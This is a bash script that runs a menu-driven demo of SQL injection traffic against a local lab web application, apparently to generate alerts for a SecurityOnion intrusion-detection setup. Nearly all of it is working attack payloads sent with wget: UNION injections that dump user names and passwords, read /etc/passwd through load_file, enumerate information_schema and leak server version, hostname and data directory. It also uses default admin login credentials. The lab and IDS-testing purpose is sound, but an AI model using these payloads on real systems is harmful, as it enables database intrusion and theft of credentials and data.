#!/bin/bash
clear
  clear
  DB_USER='root'
  DB_PASS=''
  DB='securityonion_db'
  echo logging into db $DB as $DB_USER
QUERY='SELECT COUNT(*) AS cnt, signature, signature_id FROM event WHERE status=0 AND signature LIKE "%ctp%" GROUP BY signature ORDER BY cnt DESC LIMIT 20'
QUERY2='UPDATE event SET status=1 WHERE status=0'

#Ask for the sudo password.
sudo -v
  TITLE="Demo Options"
  PROMPT="pick the number that represents the required option"
echo $TITLE
echo "1) Option 1 - Running Specific Password attacks."
echo "2) Option 2 - Using the website Normally."
echo "3) Option 3 - Running Reconaissance Attacks."
echo "4) Option 4 - Directly Querying the Database."
echo "5) Option 5 - Attacking the Database."
echo "6) Option 6 - Egressing Data from the Database."
read case;

#echo You chose $case

case $case in


	1) echo "Running the Specific Password attacks."
		
	#Running new attacks
	#Using Attack 1 from CSIT: Vl-VL-NE - 19%
	wget --save-cookies /home/ctp/Desktop/cookies.txt --keep-session-cookies --post-data "username=admin&password=password&Login=Login" http://localhost:8080/bhratach/login.php
	
	echo "Running first New Attack: ' union select null,concat(first_name,0x0a,password) from users ;#"
	wget --load-cookies /home/ctp/Desktop/cookies.txt "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%27+union+select+null%2Cconcat%28first_name%2C0x0a%2Cpassword%29+from+users+%3B%23%26Submit%3DSubmit%23&Submit=Submit"
	#This is what is added to the ID_field: ' union select null,concat(first_name,0x0a,password) from users ;#
	sleep 5
	rm index*
	echo "Running second New Attack: ' union select 2,concat(first_name,0x0a,password) from users ;#"
	wget --load-cookies /home/ctp/Desktop/cookies.txt "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%27+union+select+2%2Cconcat%28first_name%2C0x0a%2Cpassword%29+from+users+%3B%23%26Submit%3DSubmit%23&Submit=Submit"
	#This is what is added to the ID_field: ' union select 2,concat(first_name,0x0a,password) from users ;#
		sleep 5
	rm index*
	echo "Running third New Attack: ' union select null,@@datadir ;#"
	wget --load-cookies /home/ctp/Desktop/cookies.txt "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%27+union+select+null%2C%40%40datadir+%3B%23%26Submit%3DSubmit%23&Submit=Submit"
	#This is what is added to the ID_field: ' union select null,@@datadir ;#
	sleep 5
	rm index*
	echo "Running Fourth New Attack: ' union all select load_file('/etc/passwd'),null;#"
	wget --load-cookies /home/ctp/Desktop/cookies.txt "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%27+union+all+select+load_file%28%27%2Fetc%2Fpasswd%27%29%2Cnull%3B%23&Submit=Submit"
	#This is what is added to the ID_field: ' union all select load_file('/etc/passwd'),null;#
	sleep 5
	rm /home/ctp/Desktop/cookies.txt
	rm index*
	rm login.php*
	;;


	2) echo "You chose to use the website normally (i.e. Not Maliciously)."
	echo "Launching standard use"
	echo "Waiting 5 secs to start."
	sleep 5
	for i in {1..3600}
	do
		echo "Accessing Web site normally."
		#Using Attack 58 from CSIT: Vl-VL-N - 9%
		#select a random number between 0 and 5
		j=$(( RANDOM%5+0 ))
		
		wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=$j#&Submit=Submit#"
		echo "Starting Next Connection: connection No.$i"
		sleep 1
	rm index*
	done
	;;


	3) echo "You chose to run Reconnaissance Attacks."
	#All attacks will have a probability less than or equal to 36%
	for i in {1..3600}
	do
	echo "Waiting 5 secs to start the attack."
	sleep 5
	for rec in {1..1}
	do
	#Using Attack 1 from CSIT: Vl-VL-NE - 19%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=;"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 1
	rm index*
	#Using Attack 2 from CSIT: Vl-VL-NE - 19%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=)"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 1
	rm index*
	#Using Attack 124 from CSIT: Vl-VL-NE - 19%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=news1234"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 1
	rm index*
	#Using Attack 58 from CSIT: Vl-VL-N - 9%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=16"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 26 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-7/?id=1')%20%20--+"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 26 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-7/?id=5')%20%20--+"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 26 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-7/?id=4')%20%20--"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 26 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-7/?id=3')%20%20--+"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 26 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-7/?id=2')%20%20--+"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 52 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-5/?id=%27%20--+"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 125 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-1/?id=1%5C"
	sleep 1
	rm index*
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	#Using Attack 98 from CSIT: Vl-L-SE - 36%
	wget "http://localhost:8080/sql-lab/Less-5/?id=3%5C"
	sleep 1
	rm index*
	done
	echo "Next Attack sequence is number $i+1"
	 done
	;;


	4) echo "Directly Querying the Database."
	#All attacks will have a probability between 36% and 50%
	echo "Waiting for 5 secs."
	sleep 5
	for rec in {1..1}
	do
	#echo "Starting Next Database Attack No:$rec"
	#Using Attack 130 from CSIT: Vl-L-E - 43%
	#wget "http://localhost:8080/sql-lab/Less-1/?id=1%5C%20/*%20*/"
	#sleep 1
	#rm index*
	#echo "Starting Next Database Attack No:$rec"
	#Using Attack 330 from CSIT: L-L-SE - 50%
	#wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or2=2--"
	#sleep 1
	#rm index*
	#Using Attack 284 from CSIT: l-L-NE - 29%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'0'='0--"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 1
	rm index*
	#Using Attack 374 from CSIT: l-L-NE - 29%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'5'='5--"
	echo "Starting Next Recon Attack: Reconnoissance phase:$rec"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 130 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25'%20or%201=0%20union%20select%20null,%20version()%20"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 137 from CSIT: L-L-E - 60%
	wget "http://localhost:8080/sql-lab/Less-1/?id=1%27%20%20AND%201+++++++--+"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 130 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25'%20or%200=0%20union%20select%20null,%20version()%20"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 221 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25'%20or%204=4%20union%20select%20null,%20version()%20"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 319 from CSIT: L-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'1'=1--"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 222 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25'%20or%205=5%20union%20select%20null,%20version()%20"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 306 from CSIT: L-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='or'0=0'--"
	sleep 1
	rm index*
	done
	;;


	5) echo "Attacking the Database."
	#All attacks will have a probability between 50% and 70%
	echo "Sleeping for 5 Secs"
	sleep 5
	for rec in {1..1}
	do
	echo $rec
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 143 from CSIT: L-L-E - 60%
	wget "http://localhost:8080/sql-lab/Less-1/?id=999'+union+select+1,4version(),5%20--+"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 180 from CSIT: M-M-SE - 60%
	wget "http://localhost:8080/sql-lab/Less-1/?id=6%27%20order%20by%204%20and%20%272"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 199 from CSIT: M-M-SE - 60%
	wget "http://localhost:8080/sql-lab/Less-1/?id=1%27%20union%20select%201,table_name,3%20from%20information_schema.tables"
	sleep 1
	rm index*
	#echo "Starting Next Database Attack No:$rec"
	# PARSING ERROR?
	#Using Attack 238 from CSIT: M-M-SE - 60%
	#wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25'%20union%20select%20null,database()%20"
	#sleep 1
	#rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 242 from CSIT: M-M-SE - 60%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%201,schema_name%20from%20information_schema.schemata%20"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 186 from CSIT: M-M-SE - 60%
	wget "http://localhost:8080/sql-lab/Less-1/?id=1%27%20union%20select%201,2,3,4%20and%20%271"
	sleep 1
	rm index*						
	done
	;;


	6) echo "Egressing data from the database."
	#All attacks will have a probability greater than or equal to 70%
	echo "Waiting 5 secs."
	sleep 5
	for rec in {1..1}
	do
	echo $rec
	#echo "Starting Next Database Attack No:$rec"
	#Using Attack 66 from CSIT: M-ML-E - 70%
	#wget "http://localhost:8080/sql-lab/Less-6/?id=1%22%20AND%20(select%201%20from%20(select%20count(*),%20concat(0x3a,0x3a,(select%20current_user),0x3a,0x3a,%20floor(rand()*2))a%20from%20information_schema.columns%20group%20by%20a)b)%20%20%20%20--+"
	#sleep 1
	#rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 139 from CSIT: ML-ML-E - 70%
	wget "http://localhost:8080/sql-lab/Less-1/?id=1%27%20union%20select%201,2,3%20--+"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 162 from CSIT: M-MH-E - 70%
	wget "http://localhost:8080/sql-lab/Less-1/?id=20%27+union+select+1,group_concat(username),group_concat(password)%20from%20users--+"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 157 from CSIT: M-M-E - 70%
	wget "http://localhost:8080/sql-lab/Less-1/?id=20%27+union+select+1,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()%20--+"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 257 from CSIT: M-H-E - 70%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,concat(first_name,0x0a,password)%20from%20users%20"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 258 from CSIT: M-M-E - 70%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%200,concat(table_name,0x0a,column_name)%20from%20information_schema.columns%20where%20table_name=%20'users'%20"
	sleep 1
	rm index*
	#echo "Starting Next Database Attack No:$rec"
	#Using Attack 283 from CSIT: M-H-E - 70%
	#wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit#"
	#sleep 1
	#rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 282 from CSIT: M-H-E - 70%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,@@datadir%20"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 491 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,%20@@hostname"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 490 from CSIT: M-L-SE - 50%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,%20@@version"
	sleep 1
	rm index*
	echo "Starting Next Database Attack No:$rec"
	#Using Attack 282 from CSIT: M-H-E - 70%
	wget "http://localhost:8080/bhratach/flag/extranet/sqli/?id='%20union%20select%20null,datadir%20"
	sleep 1
	done
	;;
esac